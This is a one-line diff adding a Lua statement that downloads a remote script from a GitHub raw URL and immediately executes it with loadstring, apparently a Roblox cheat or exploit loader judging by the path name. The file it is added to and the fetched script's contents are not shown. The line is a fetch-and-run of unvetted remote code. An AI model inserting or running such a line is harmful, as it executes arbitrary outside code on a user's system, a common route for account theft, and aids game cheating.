@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/2x-exp-warden-sonaria-horror-escape-spam7-s5y6sx30o8zpmd.lua"))()
